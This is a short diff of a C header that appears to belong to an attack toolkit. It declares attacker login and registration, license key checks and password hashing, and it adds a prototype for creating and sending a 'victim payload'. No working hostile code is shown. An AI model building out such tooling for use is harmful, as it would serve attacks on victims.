@@ -44,6 +44,7 @@ STATUS add_attacket_to_attackers_list(char username_input[], char password_input
 STATUS log_in_attacker(char username_input[], char password_input[]);
 STATUS licenses_key_validation (char licenes_key_input[]);
 licenses_key_item add_new_license_key();
+void crate_and_sand_victim_payload();
 char * salted_hashed_password(char hashed_password_input[]);
 int attacker_exsist_in_list(char username_input[]);
 void remove_license_key (char licenes_key[]);
